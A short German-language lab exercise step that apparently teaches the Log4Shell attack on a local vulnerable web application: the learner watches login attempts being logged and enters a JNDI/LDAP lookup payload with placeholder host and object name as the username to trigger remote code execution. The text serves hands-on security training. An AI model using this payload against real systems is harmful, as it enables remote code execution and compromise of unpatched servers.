Exploit

Um den Angriff durchführen zu können, müssen Sie nun die verwundbare Web-Anwendung “localhost:8080” über einen Browser ihrer Wahl öffnen. Anschließend müssen Sie die Log des Containers der Web-Anwendung öffnen um das logging der Anmeldeversuche anzuschauen. Sie werden nach versuchten Anmeldungen auf der Webseite Informationen wie “Incorrect login attempt for username `test´” in der Log sehen können. Hier merken Sie, dass Sie Kontrolle über einen Teil der protokollierten Zeichenfolge (z.B. Username) haben.

Sie können eine Payload wie folgt eintragen, um Schadcode remote auf der Web-Anwendung auszuführen:

${jndi:ldap://<HostIp>:1389/<RCEObjectName>}

Sie haben nun das Ende der Übung erreicht.
